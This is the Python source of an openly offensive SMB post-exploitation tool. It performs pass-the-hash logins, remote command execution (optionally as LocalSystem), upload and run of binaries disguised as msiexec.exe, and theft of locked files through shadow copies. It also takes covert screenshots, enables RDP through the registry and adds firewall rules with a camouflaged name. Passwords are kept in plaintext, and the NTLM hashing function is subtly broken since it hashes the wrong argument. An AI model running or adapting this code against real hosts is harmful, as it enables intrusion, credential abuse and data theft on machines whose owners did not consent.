#!/usr/bin/env python
# Copyright (C) 2015 jeremy s.
# Contact: jrm` on irc.freenode.net

# This program is free software: you can redistribute it and/or modify it
# under the terms of the GNU General Public License as published by the Free
# Software Foundation, either version 3 of the License, or (at your option)
# any later version.

# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
# FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
# more details.

# You should have received a copy of the GNU General Public License along
# with this program.  If not, see <http://www.gnu.org/licenses/>.

import sys, os, time, string, socket, subprocess
from pprint import pprint

try:
	import sqlite3
except:
	print "[!] Please install python-sqlite3 extension."
	sys.exit(0)

__version__ = 0.9
__author__ = 'jrm`'
__description__ = 'Run stuff remotely - Extract passwords - Pass the Hash'

BASEDIR = os.path.dirname(os.path.realpath(__file__)) + '/tools'
TOOLS = {
	'smbclient': BASEDIR +  '/smbclient', # Version with Pass-The-Hash support
	'winexe': BASEDIR + '/winexe', # Version with Pass-The-Hash support
	'vsscpy': BASEDIR + '/win/vsscpy.vbs',
	'xfreerdp': BASEDIR + '/xfreerdp',
	'socat': BASEDIR + '/socat',
	'socat.tar': BASEDIR + '/win/socat.tar',
	'tar': BASEDIR + '/win/tar.exe',
	'nircmd': BASEDIR + '/win/nircmd.exe',
	'runastask': BASEDIR + '/win/runastask.exe',
	'mbsa': {'dll': BASEDIR + '/win/mbsa/$ARCH$/wusscan.dll', 'exe': BASEDIR + '/win/mbsa/$ARCH$/mbsacli.exe'},
}
CONF = {
	'system': False,
	'creds_file': os.environ['HOME'] + '/.smbwrapper.vault',
	'verbose': True,
	'smb_user': '',
	'smb_pass': '',
	'smb_hash': '',
	'smb_ip': '',
}

def main():
	sys.argv[0] = os.path.basename(sys.argv[0])

	if len(sys.argv) < 3 or '-h' in sys.argv or 'help' in sys.argv:
		usage()

	check_vault()

	# Enable LocalSystem elevation where possible
	if '-s' in sys.argv:
		CONF['system'] = True
		sys.argv = [x for x in sys.argv if x != '-s']

	# Use an alternate credential vault
	if '-f' in sys.argv:
		pos = sys.argv.index('-f')
		try:
			CONF['creds_file'] = sys.argv[pos+1]
			del sys.argv[pos:pos+1]
		except:
			text("[!] Option -f requires an argument.")
			sys.exit(0)

		if not os.path.exists(CONF['creds_file']):
			text("[!] %s: file not found." % CONF['creds_file'])
			sys.exit(0)

	# Check command validity and jump to main function
	command = 'smb_%s' % sys.argv[1]
	if command in dict(get_commands()).keys():

		if sys.argv[1] not in ['creds', 'hash', 'rdp', 'mount']:
			check_host()

		try:
			CONF['smb_ip'] = sys.argv[2]
		except:
			usage()

		globals()[command]()

	else:
		text("[!] Not a valid command.")
		sys.exit(0)

def color(txt, code = 1, modifier = 0):
	return "\033[%d;3%dm%s\033[0m" % (modifier, code, txt)

def text(txt, r = False):

	if CONF['verbose']:

		chars = txt[0:3]

		if txt[0:3] == '[*]':
			ret = color('[*]', 2, 1) + txt[3:]
		elif txt[0:3] == '[!]':
			ret = color('[!]', 1, 1) + txt[3:]
		elif txt[0:3] == '[i]':
			ret = color(txt, 3, 1);
		else:
			ret = txt

	if r == True:
		return ret + "\n"
	else:
		print ret

def check_vault():

	# Creating the vault if it doesn't exist
	if not os.path.exists(CONF['creds_file']):
		cursor = sqlite3.connect(CONF['creds_file'])
		cursor.execute('CREATE TABLE creds (active INTEGER, username varchar(32), password varchar(32), ntlm_hash varchar(32), comment varchar(256))')
		cursor.commit()
		cursor.close()

def check_creds():

	check_tool('smbclient')
	check = smbclient('quit')

	if 'session setup failed' in check or 'tree connect failed' in check:
		text('[!] %s' % check)
		sys.exit(0)

	return True

def check_tool(tool):
	if tool in TOOLS.keys():
		return check_path(TOOLS[tool])

	return False

def check_host():
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
		sock.settimeout(2)
		sock.connect((sys.argv[2], 445))
		sock.close()
	except:
		text("[!] %s: port 445 unreachable" % sys.argv[2])
		sys.exit(0)

def check_path(path):
	if '$ARCH$' in path:
		check_path(path.replace('$ARCH$', 'x86'))
		check_path(path.replace('$ARCH$', 'x64'))
	else:
		if not os.path.exists(path):
			text("[!] %s: file not found." % path)
			sys.exit(0)

	return True

def get_commands():

	funcs = {}
	for a, b in sys.modules[__name__].__dict__.iteritems():
		if a.startswith('smb_'):
			funcs[id(b)] = a

	commands = []
	for k in sorted(funcs):
		commands.append((funcs[k],  str(globals()[funcs[k]].__doc__).strip()))

	return commands

def usage():

	try: c = os.path.basename(sys.argv[1])
	except: c = 'help'

	f = os.path.basename(__file__)

	print color(f +" v%.1f by %s - %s\n" % (__version__, __author__, __description__), 6, 1)
	print color(f +" -h", 7, 1) +" \t\t\t This help"
	print color(f +" -f <file>", 7, 1) +"\t\t Specify an alternative credential vault"

	if c == 'help':
		print ""
		print "   " + color("The following commands are currently implemented:\n", 7, 4)

	else:
		print ""
		print color("Command usage:\n", 7, 4);	

	for cmd in get_commands():
		if c == 'help' or c == cmd[0][4:]:
			print "   %s %s" % (color('%s %s' % (f,cmd[0][4:]), 3, 1), cmd[1])
			print ""

	print "   If the command supports it, use the "+ color("'-s'", 7, 1) +" option to attempt remote LocalSystem elevation.\n"
	print "   Instead of using username+password or username+hash on the commandline,"
	print "   you can use the "+ color("smb creds", 3, 1) +" command to populate the credential vault.\n"
	print "   Usernames must be specified using the "+ color("DOMAIN\\LOGIN", 7, 1) +" syntax.\n"

	sys.exit(0)

def creds_from_file():

	cursor = sqlite3.connect(CONF['creds_file'])

	# Get the number of active credentials
	res = cursor.execute("SELECT COUNT(*) AS count FROM creds WHERE active=1")
	(count,) = res.fetchone()

	if count == 0:
		text("[!] No credentials to use. Use the smb_creds command to add some.")
		sys.exit(0)

	res = cursor.execute("SELECT username, password, ntlm_hash FROM creds WHERE active=1 LIMIT 1")

	for row in res:
		CONF['smb_user'] = row[0]
		CONF['smb_pass'] = row[1]
		CONF['smb_hash'] = row[2]
		os.environ['SMBHASH'] = '00000000000000000000000000000000:' + CONF['smb_hash']

	cursor.close()

def creds_from_cmdline():

	# Parsing command line to get credentials to use
	CONF['smb_user'] = sys.argv[3]

	if all(c in string.hexdigits for c in sys.argv[4]) and len(sys.argv[4]) == 32:
		CONF['smb_pass'] = ''
		CONF['smb_hash'] = sys.argv[4]
		os.environ['SMBHASH'] = '00000000000000000000000000000000:' + CONF['smb_hash']
	
	else:
		CONF['smb_pass'] = sys.argv[4]
		CONF['smb_hash'] = ntlm_hash(sys.argv[4])

	del sys.argv[2:4]

def set_creds(l1, l2):

	if len(sys.argv) >= l2:
		creds_from_cmdline()

	elif len(sys.argv) >= l1:
		creds_from_file()

	else:
		usage()

def ntlm_hash(str):
	import hashlib, binascii
	hash = hashlib.new('md4', sys.argv[2].encode('utf-16le')).digest()
	return binascii.hexlify(hash).upper()

def smbclient(cmd):
	check_tool('smbclient')
	creds = '%s%%%s' % (CONF['smb_user'], CONF['smb_pass'])

	run = []
	run.append(TOOLS['smbclient'])
	run.append('-U')
	run.append(creds)
	run.append('//'+ CONF['smb_ip'] +'/c$')
	run.append('-c')
	run.append(cmd)

	process = subprocess.Popen(run, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
	
	ret = process.stdout.read()
	ret = ret.replace('\x00', '')
	return ret.strip()

def winexe(cmd):
	check_tool('winexe')
	creds = '%s%%%s' % (CONF['smb_user'], CONF['smb_pass'])

	run = []
	run.append(TOOLS['winexe'])
	if CONF['system']:
		run.append('--system')
	run.append('--uninstall')
	run.append('--interactive=0')
	run.append('--scope=127.0.0.1')
	run.append('-U')
	run.append(creds)
	run.append('//'+ CONF['smb_ip'])
	run.append(cmd)

	if cmd.lower() != 'cmd':
		process = subprocess.Popen(run, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
		
		ret = process.stdout.read()
		ret = ret.replace('\x00', '')
		return ret.strip()

	# For an interactive command line, don't use popen
	os.spawnvpe(os.P_WAIT, run[0], run, os.environ)
	return ''

def os_architecture():
	check = smbclient('dir "\Program Files (x86)"')

	if 'NO_SUCH_FILE' in check:
		return 32

	return 64

def screen_resolution():
	xrandr = subprocess.Popen(['xrandr', '--current'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.readlines()
	
	for l in xrandr:
		if '*' in l:
			return l.split()[0].split('x')

	return ['1024', '768']

def up_and_exec(localcmd, delete_after = True):

	if os.path.exists(localcmd[0]):

		smbclient('put "%s" "\\windows\\temp\\msiexec.exe"' % localcmd[0])
		ret = winexe('\\windows\\temp\\msiexec.exe %s' % ' '.join(localcmd[1:]))

		if delete_after:
			smbclient('del "\\windows\\temp\\msiexec.exe"')

		return ret

	else:
		text("[!] %s: file not found." % localcmd[0])
		sys.exit(0)

def smb_exec():
	"""
	[-s] <ip> [ user ] [ password | ntlm_hash ] <cmd>
	Execute a command remotely (use "cmd" for a command prompt)
	"""

	set_creds(4, 6)
	check_creds()
	print winexe(' '.join(sys.argv[3:]))

def smb_upexec():
	"""
	[-s] <ip> [ user ] [ password | ntlm_hash ] <localfile.exe [-arg1 [-argx]]>
	Upload a file and run it remotely with the specified arguments
	"""

	set_creds(4, 6)
	check_creds()
	print up_and_exec(sys.argv[3:])

def smb_upload():
	"""
	[-s] <ip> [ user ] [ password | ntlm_hash ] <localfile> <remotefile>
	Upload a file to the host
	"""

	set_creds(5, 7)
	check_creds()

	if len(sys.argv) != 5:
		usage()

	if os.path.exists(sys.argv[3]):
		print smbclient('put "%s" "%s"' % (sys.argv[3], sys.argv[4]))
	else:
		text("[!] %s: file not found." % sys.argv[3])
		sys.exit(0)

def smb_download():
	"""
	[-s] <ip> [ user ] [ password | ntlm_hash ] <remotefile> <localfile>
	Download a file from the host
	"""

	set_creds(5, 7)
	check_creds()

	if len(sys.argv) != 5:
		usage()

	print smbclient('get "%s" "%s"' % (sys.argv[3], sys.argv[4]))

def smb_scrshot():
	"""
	[-s] <ip> [ user ] [ password | ntlm_hash ]
	Takes a screenshot of the active session
	"""

	set_creds(3, 5)
	check_tool('runastask')
	check_tool('nircmd')

	text("[*] Uploading tools...")
	smbclient('put "%s" "\\windows\\temp\\r.exe"' % TOOLS['runastask'])
	smbclient('put "%s" "\\windows\\temp\\n.exe"' % TOOLS['nircmd'])

	text("[*] Capturing screenshot...")
	filename = '/tmp/screenshot.%s.png' % str(time.time())

	winexe('\\windows\\temp\\r.exe %s C:\\windows\\temp\\n.exe savescreenshotfull C:\\windows\\temp\\s.png' % CONF['smb_user'])
	smbclient('get "\\windows\\temp\\s.png" "%s"' % filename);

	text("[*] Cleaning files...")
	smbclient('del "\\windows\\temp\\n.exe"')
	smbclient('del "\\windows\\temp\\r.exe"')
	smbclient('del "\\windows\\temp\\s.png"')

	if os.path.exists(filename):

		text("[*] Screenshot saved under %s." % filename)
		os.system('display "%s" &' % filename)
		text("[*] Done.")
	
	else:
		text("[!] Failed. Is the user logged in?.")
		sys.exit(0)

def smb_vsscpy():
	"""
	[-s] <ip> [ user ] [ password | ntlm_hash ] <remotefile> <localfile>
	Use shadow copies to download a locked file from the host
	"""

	check_tool('vsscpy')
	set_creds(5, 7)

	if len(sys.argv) != 5:
		usage()

	check_creds()

	remotefile = sys.argv[3]
	localfile = sys.argv[4]

	text("[*] Uploading script...")
	smbclient('put "%s" "\\windows\\temp\\vsscpy.vbs"' % TOOLS['vsscpy'])

	text("[*] Running script...")
	winexe('cscript \\windows\\temp\\vsscpy.vbs "%s"' % remotefile.lower().replace('c:', ''))

	text("[*] Downloading file...")
	print smbclient('get "\\windows\\temp\\temp.tmp" "%s"' % localfile)

	text("[*] Removing temp files...")
	smbclient('del "\\windows\\temp\\temp.tmp"')
	smbclient('del "\\windows\\temp\\vsscpy.vbs"')

	text("[*] Done.");

def smb_fwrule(action = None, param = None):
	"""
	[-s] <ip> [ user ] [ password ] <add | del> <program path | port number>
	Creates or remove a rule in the Windows firewall
	"""

	import inspect
	
	if len(inspect.stack()) == 3: # Function called directly from command line

		set_creds(5, 7)
		check_creds()

		if len(sys.argv) != 5 or sys.argv[3] not in ['add', 'del']:
			usage()

		action = sys.argv[3]
		param = sys.argv[4]

	name = 'Core Networking - SMB' # Or whatever you want as a rule name
	param = str(param)

	text("[*] %sing firewall rule..." % ('Add' if action == 'add' else 'Delet'))
	
	if param.isdigit(): # Adding a port rule
		ret = winexe('netsh advfirewall firewall %s rule dir=in name="%s" %s protocol=TCP localport=%s' % 
			(action, name, 'action=allow' if action == 'add' else '', param))

	else: # Adding a program rule
		ret = winexe('netsh advfirewall firewall %s rule dir=out name="%s" %s program="%s"' % 
			(action, name, 'action=allow' if action == 'add' else '', param))

	if 'Ok.' in ret:
		text("[*] Success.")
	else:
		text("[!] Failed.")

def smb_mount():
	"""
	<ip> [ user ] [ password ] <share> <localpath>
	Mount a remote share locally via CIFS (Pass-the-Hash not available)
	"""

	set_creds(5, 7)

	if len(sys.argv) != 5:
		usage()

	share = sys.argv[3]
	localdir = sys.argv[4]

	if not os.path.exists(localdir):
		os.mkdir(localdir)

	if CONF['smb_pass'] == '':
		text("[!] Pass-The-Hash not available for mount.")
		sys.exit(0)

	opts = ['password='+ CONF['smb_pass'], 'uid='+ str(os.getuid()), 'gid='+ str(os.getgid()), 'file_mode=0644', 'dir_mode=0755']

	if '\\' in CONF['smb_user']:
		opts += CONF['smb_user'].split('\\')

	else:
		opts += ['username='+ CONF['smb_user']]

	os.system('sudo mount -t cifs -o "%s" "//%s/%s" "%s"' % (','.join(opts), CONF['smb_ip'], share, localdir))

def smb_rdp():
	"""
	<ip> [ user ] [ password | ntlm_hash ] [ enable | disable ]
	Open a Remote Desktop session using xfreerdp (Pass-the-Hash = restricted admin)
	"""

	if 'enable' in sys.argv:
		set_creds(4, 6)
		text("[*] Updating Registry...")
		winexe('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
		smb_fwrule('add', 3389)
		sys.exit(0)

	if 'disable' in sys.argv:
		set_creds(4, 6)
		text("[*] Updating Registry...")
		winexe('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f')
		smb_fwrule('del', 3389);
		sys.exit(0)

	set_creds(3, 5)
	check_tool('xfreerdp')

	res = screen_resolution()
	max_res = '%dx%d' % (int(res[0]), int(res[1]) - 50)

	run = []
	run.append(TOOLS['xfreerdp'])
	run.append('/size:%s' % max_res)
	run.append('/t:%s' % CONF['smb_ip'])
	run.append('/v:%s' % CONF['smb_ip'])

	if '\\' in CONF['smb_user']:
		tab = CONF['smb_user'].split('\\', 2)
		run.append('/d:%s' % tab[0])
		run.append('/u:%s' % tab[1])

	else:
		run.append('/u:%s' % CONF['smb_user'])

	if CONF['smb_pass'] == '':
		text("[!] Note: Pass-the-Hash with RDP only works for local admin accounts and under the restricted admin mode.")
		run.append('/pth:%s' % CONF['smb_hash'])
		run.append('/restricted-admin')

	else:
		run.append('/p:%s' % CONF['smb_pass'])

	# Tweak the following to suit your needs
	run.append("+clipboard")
	run.append("+home-drive")
	run.append("-decorations")
	run.append("/cert-ignore") # baaad.

	os.spawnvpe(os.P_WAIT, run[0], run, os.environ)

def smb_portfwd():
	"""
	[-s] <ip> [ user ] [ password | ntlm_hash ] <lport> <rhost> <rport>
	Forward a remote port to a remote address
	"""

	print 'smb_portfwd not yet implemented'

def smb_revfwd():
	"""
	[-s] <ip> [ user ] [ password | ntlm_hash ] <lport> <rhost> <rport>
	Reverse-forward a remote address/port locally
	"""

	print 'smb_revtun not yet implemented'

def smb_mbsa():
	"""
	[-s] <ip> [ user ] [ password | ntlm_hash ]
	Run MBSA on the remote host
	"""

	print 'smb_mbsa not yet implemented'

def smb_creds():
	"""
	[ list | set | del | use ] <user> <password | ntlm_hash>
	Manage SMB credentials
	"""

	if len(sys.argv) < 3:
		usage()

	if sys.argv[2] == 'list':
		cursor = sqlite3.connect(CONF['creds_file'])
		res = cursor.execute('SELECT * FROM creds')
		
		for row in res:
			print 'Active   : %s' % ('*' if row[0] != 0 else '')
			print 'Username : %s' % row[1]
			print 'Passwd   : %s' % row[2]
			print 'NT Hash  : %s' % row[3]
			print 'Comment  : %s' % row[4]
			print "-- "
		
		cursor.close()
	else:
		u = p = h = c = ''

		if len(sys.argv) > 3:
			u = sys.argv[3].split('\\', 2)

			if len(u) > 1:
				d = u.pop(0).upper()
				u = '%s\\%s' % (d, string.capwords(u.pop(0)))
			else:
				u = '\\'.join(u)

		if len(sys.argv) > 4:
			# We have a NT Hash instead of a password
			if all(c in string.hexdigits for c in sys.argv[4]) and len(sys.argv[4]) == 32:
				p = ''
				h = sys.argv[4].upper()
			else:
				p = sys.argv[4]
				h = ntlm_hash(p)

		if len(sys.argv) > 5:
			c = sys.argv[5]

		# Get the number of matching usernames in db for below use
		cursor = sqlite3.connect(CONF['creds_file'])
		res = cursor.execute("SELECT COUNT(*) AS count FROM creds WHERE LOWER(username)=LOWER(?)", (u,))
		(count,) = res.fetchone()
		cursor.close()

	if sys.argv[2] == 'set' or sys.argv[2] == 'add':

		if len(sys.argv) >= 5:

			cursor = sqlite3.connect(CONF['creds_file'])

			# Insert or update credential
			if count == 0:
				cursor.execute("UPDATE creds SET active=0")
				cursor.execute("INSERT INTO creds VALUES(1, ?, ?, ?, ?)", (u, p, h, c))
				cursor.commit()
				text("[*] Credentials added and marked as active.")
			else:
				cursor.execute("UPDATE creds SET active=0")
				cursor.execute("UPDATE creds SET active=1, password = ?, ntlm_hash = ?, comment = ? WHERE LOWER(username)=LOWER(?)", (p, h, c, u))
				cursor.commit()
				text("[*] Credentials updated and marked as active.")

			cursor.close()

	if sys.argv[2] == 'del':
		
		if len(sys.argv) == 4:

			cursor = sqlite3.connect(CONF['creds_file'])

			# Delete credential
			if count == 1:
				cursor.execute("DELETE FROM creds WHERE LOWER(username)=LOWER(?)", (u,))
				cursor.commit()
				text("[*] Credentials removed for '%s'." % u)
			else:
				text("[!] No such credentials in vault.")

			cursor.close()

	if sys.argv[2] == 'use':
		
		if len(sys.argv) == 4:

			cursor = sqlite3.connect(CONF['creds_file'])

			# Mark credential active
			if count == 1:
				cursor.execute("UPDATE creds SET active=0")
				cursor.execute("UPDATE creds SET active=1 WHERE LOWER(username)=LOWER(?)", (u,))
				cursor.commit()
				text("[*] Active credentials set to '%s'." % u)
			else:
				text("[!] No credentials found for this username.")

			cursor.close()

def smb_hash():
	"""
	<plaintext>
	Generate a NTLM hash from a plaintex
	"""

	print ntlm_hash(sys.argv[2])

if __name__ == "__main__":
	main()